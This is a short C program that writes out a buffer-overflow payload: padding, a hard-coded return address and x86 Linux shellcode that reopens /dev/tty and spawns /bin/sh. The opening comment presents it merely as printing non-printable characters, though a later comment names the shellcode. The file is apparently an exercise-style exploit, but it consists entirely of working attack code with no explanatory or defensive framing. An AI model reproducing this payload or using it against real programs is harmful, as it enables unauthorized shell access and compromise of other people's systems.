//This code will print non-printable characters (think hexadecimal values for memory addresses) to a file
#include <stdio.h>

/* This is shellcode provided by Marco Ivaldi for stdin re-open and /bin/sh execution */
char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
    unsigned int nonprintable=0xbffff660;
    printf("0123456789ab0123456789ab%s%s\n",(char *)&nonprintable,sc);
    return 0;
}